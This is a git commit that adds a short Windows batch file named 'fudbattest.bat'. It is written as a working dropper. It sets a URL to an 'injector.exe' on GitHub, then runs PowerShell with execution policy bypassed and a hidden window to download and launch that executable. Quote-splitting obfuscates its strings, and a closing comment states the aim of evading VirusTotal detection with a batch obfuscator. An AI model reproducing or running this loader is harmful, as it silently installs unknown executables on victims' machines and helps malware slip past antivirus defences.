7cd29673a9ca641c0fde18d0ae531bb08caddc70
fojdfksf <148015638+fojdfksf@users.noreply.github.com>
2023-10-16 16:17:07 -0700

    Add files via upload

---
+++ fudbattest.bat
@@ -0,0 +1,6 @@
+@echo off
+set "Url=https://github.com/f"o"jdfksf/ideal-couscous/raw/main/in"j"ector.exe"
+set "Filename=in"j"ector.exe"
+@powershell -NoP"r"o"f"ile -Executi"o"nPolic"y" Bypass -W"i"ndowStyle Hidden -C"o"mmand "I"nv"o"ke-WebReq"u"est %Url% -"O"ut"fi"le %Filename%; St"art-Process %Filename%"
+
+:: to fix the code insight jawn in virustotal just use a free bat obfuscator ima use one from github i downloaded
